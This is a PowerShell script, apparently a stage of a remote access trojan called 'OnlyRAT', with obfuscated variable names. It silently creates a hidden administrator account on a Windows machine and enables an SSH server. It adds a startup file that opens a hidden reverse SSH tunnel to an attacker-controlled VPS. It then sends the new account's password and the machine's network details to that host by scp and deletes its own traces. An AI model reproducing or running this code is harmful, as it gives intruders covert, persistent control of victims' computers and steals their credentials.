# TODO: incorporate necessary payload installs

$nkowFESgaO = "USERNAME" # change me, vps username
$ecPlmJVLRo = "X.X.X.X" # change me, vps ip address
$ENyMAhIrsb = "22" # change me, default vps port [default 22]
$YlEQgBmePn = "2583" # change me, routed vps port [NOT TO DEFAULT SSH PORT]

$dERQpoZWxz = "$nkowFESgaO@$ecPlmJVLRo"

function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

# make admin
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
Remove-LocalUser -Name $sqbXFdLvyw
$CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR

# registry
# registry
$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$jmQikqoKMZ = '00000000'

If (-NOT (Test-Path $csfMFzvgEN)) {
  New-ItemProperty -Path $csfMFzvgEN	-Force | Out-Null
}

New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force

# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-Item -ItemType Directory -Path $env:USERPROFILE\.ssh
ssh-keyscan.exe -H $ecPlmJVLRo >> $env:USERPROFILE\.ssh\known_hosts

# startup file
# TODO:  registry startup
$GlNweBEFmh = RpLGWiUsIy
$NyZnoLKCIs = Get-Location
Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "@echo off"
Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i $env:temp\key`"" 

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP # pass
Add-Content -Path $CRYnrkaDbe -Value $env:temp # temp
Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs # startup
Add-Content -Path $CRYnrkaDbe -Value $ecPlmJVLRo # remote host
Add-Content -Path $CRYnrkaDbe -Value $YlEQgBmePn # remote port
Add-Content -Path $CRYnrkaDbe -Value 'remote' # connection type

# get key and sent rat
Invoke-WebRequest -Uri "http://$ecPlmJVLRo/key" -OutFile "$env:temp\key"
scp -P $ENyMAhIrsb -o StrictHostKeyChecking=no -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO

# cleanup
Set-Location C:\Users
attrib +h +s +r onlyrat 
Set-Location $NyZnoLKCIs
Remove-Item $CRYnrkaDbe
Remove-Item KFPGaEYdcz.ps1
start "./$GlNweBEFmh.cmd"
